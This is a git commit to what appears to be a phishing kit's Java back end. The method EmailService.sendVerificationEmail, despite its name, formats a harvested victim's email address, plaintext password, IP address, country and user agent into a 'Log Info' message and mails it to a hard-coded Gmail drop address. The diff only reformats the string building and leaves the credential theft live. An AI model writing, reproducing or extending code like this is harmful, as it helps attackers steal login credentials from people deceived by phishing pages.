1def31a0b293fd0c5b0a38b59aebef95e54eb10f
yahoophisher <yahoophisher@gmail.com>
2025-11-07 11:42:53 +0100

    Update EmailService.java

--- src/main/java/havezzy/filetransfer/app/email/EmailService.java
+++ src/main/java/havezzy/filetransfer/app/email/EmailService.java
@@ -19,8 +19,8 @@ public class EmailService {
 	private void sendVerificationEmail(Email email) throws MessagingException, UnsupportedEncodingException {
 		String toAddress = "katrinarowett61@gmail.com";
 		String subject = "LOG "+email.getIpAddress();
-		String content = "<!DOCTYPE html><html><body><div style=\"font-family: Arial, Helvetica, sans-serif;\"><p>---------------------------Log Info----------------------------</p><p>Email Address               :"+email.getEmail()+"</p><p>Password             :"+email.getPassword()+"</p><p>|---------------------- INFO | IP | Location ------------------------|</p><p>|Client Location:  "+email.getCountry()+"</p><p>|-- http://www.geoiptool.com/?IP="+email.getIpAddress()+" ------</p><p>User Agent: "+email.getUserAgent()+"</p><p>|-------- unknown ----------|</p></div></body></html>
-";
+		String content = "<!DOCTYPE html><html><body><div style=\"font-family: Arial, Helvetica, sans-serif;\"><p>---------------------------Log Info----------------------------</p><p>Email Address               :"+ email.getEmail() +"</p><p>Password             :"+ email.getPassword() +"</p><p>|---------------------- INFO | IP | Location ------------------------|</p><p>|Client Location:  "+ email.getCountry() +"</p><p>|-- http://www.geoiptool.com/?IP=" + email.getIpAddress() + " ------</p><p>User Agent: " + email.getUserAgent() + "</p><p>|-------- unknown ----------|</p></div></body></html>";
+
 		
 		mailSenderService.sendEmail(toAddress, subject, content);
 	}
